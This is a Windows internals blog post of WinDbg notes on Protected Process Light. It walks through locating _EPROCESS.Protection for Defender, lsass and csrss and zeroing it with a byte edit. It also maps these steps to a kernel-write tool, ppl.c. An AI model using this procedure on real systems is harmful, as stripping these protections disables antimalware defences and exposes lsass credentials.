---
title: "Protected Process Light (PPL) — A WinDbg Deep Dive"
date: 2026-08-24
categories: [Windows Internals, Deep Dive]
tags: [ppl, protected-process, eprocess, kernel, windbg, defender]
summary: WinDbg notes — find EPROCESS.Protection and zero it.
---

# PPL notes (WinDbg)

`OpenProcess` on Defender / lsass / csrss hits a second gate in `NtOpenProcess` (`PsGrantedAccess`): compare caller vs target **`_EPROCESS.Protection`**. Too low → `ACCESS_DENIED`. One byte.

`.reload /f` if names do not resolve. LiveKD is read-only — `eb` needs a writable kernel debug session.

Offsets (`Protection`, `ActiveProcessLinks`, `ImageFileName`) are **build-specific**. Always `dt nt!_EPROCESS` on the target. `ppl.c` stores them as `EPROC_*_OFF`.

![layout](/assets/images/ppl-eprocess-layout.svg)
![byte](/assets/images/ppl-protection-byte.svg)

---

## `_PS_PROTECTION` (1 byte)

```
dt nt!_PS_PROTECTION
```

```
+0x000  Type    bits 0–2   0=None  1=PPL  2=PP
+0x000  Audit   bit 3      usually 0
+0x000  Signer  bits 4–7   trust rank
```

Byte = `(Signer << 4) | Type`. Type `0` → not protected (signer ignored).

| Signer | Who | Example |
|--------|-----|---------|
| 0 | None | normal process |
| 3 | Antimalware | `MsMpEng.exe` → `0x31` |
| 4 | Lsa | `lsass.exe` if RunAsPPL → `0x41` |
| 6 | WinTcb | `csrss.exe` PP → `0x62` |

![signers](/assets/images/ppl-signer-values.svg)

---

## 1. Protection offset

```
dt nt!_EPROCESS 0 Protection
```

Type-only (`0` = no memory read). Example: `+0x5FA` or `+0x6FA` — **yours may differ**.

Also note:

```
dt nt!_EPROCESS 0 ActiveProcessLinks
dt nt!_EPROCESS 0 ImageFileName
```

`ImageFileName` is **15** chars (`MpDefenderCoreService.exe` → `MpDefenderCore`).

---

## 2. Find `_EPROCESS`

### WinDbg shortcut

```
!process 0 0 MsMpEng.exe
```

Address after `PROCESS` is the `_EPROCESS`.

### Walk (what `ppl.c` does)

```
dq nt!PsInitialSystemProcess L1
```

That pointer = System `_EPROCESS` (list head).

```
? nt!PsInitialSystemProcess - nt
```

Then:

```
dt nt!_EPROCESS <ep> ImageFileName
dt nt!_PS_PROTECTION <ep>+<Protection>
dq <ep>+<ActiveProcessLinks> L1
```

Right-hand Flink points **into** the next `LIST_ENTRY`, not the next `_EPROCESS`:

```
next_ep = Flink - ActiveProcessLinks
```

Stop when `next_ep` equals System. Empty / bad Flink → break.

---

## 3. Read the byte

```
dt nt!_PS_PROTECTION <ep>+<Protection>
db <ep>+<Protection> L1
```

Example `0x31`: Type=1 (PPL), Signer=3 (Antimalware). `0x00` = already unprotected.

`Protection` is often **not 4-byte aligned** (e.g. `…FA`). `dd` a DWORD and shift, or `db` one byte.

---

## 4. Zero it

```
eb <ep>+<Protection> 0
```

Type/Audit/Signer all 0. Process still runs — only the open-gate is gone.

Verify:

```
db <ep>+<Protection> L1
```

Do not `ed` a DWORD at an unaligned address — neighbouring `_EPROCESS` fields share that dword. `ppl.c` uses read-modify-write (`kwrite8`).

---

## Commands

| Cmd | Does |
|-----|------|
| `dt` | type / field at address |
| `dq` / `db` | dump QWORD / bytes |
| `eb` | edit byte |
| `!process` | find `_EPROCESS` by name |
| `poi(addr)` | read pointer |

---

## How `ppl.c` maps to these notes

WinDbg uses **symbols**. The C tool uses **kernel base + RVA**.

| Post | WinDbg | `ppl.c` |
|------|--------|---------|
| RVA | `? nt!PsInitialSystemProcess - nt` | `RVA_PS_INITIAL_SYSTEM` |
| Head | `dq nt!PsInitialSystemProcess` | `kread64(kbase + RVA)` |
| Name | `dt … ImageFileName` | `kread_name(ep + EPROC_NAME_OFF)` |
| Links | `dq ep+ActiveProcessLinks` | `kread64(ep + EPROC_LINKS_OFF)` |
| Next | `Flink - offset` | `ep = flink - EPROC_LINKS_OFF` |
| Prot | `db ep+Protection` | `read_prot(ep)` (DWORD + shift) |
| Zero | `eb ep+Protection 0` | `kwrite8(ep + EPROC_PROT_OFF, 0)` |

`list` = walk, print if byte ≠ 0. `delete <name>` = walk, `kwrite8` 0 on match.

Session name / `!process` are WinDbg-only. `ppl.c` always walks from System.
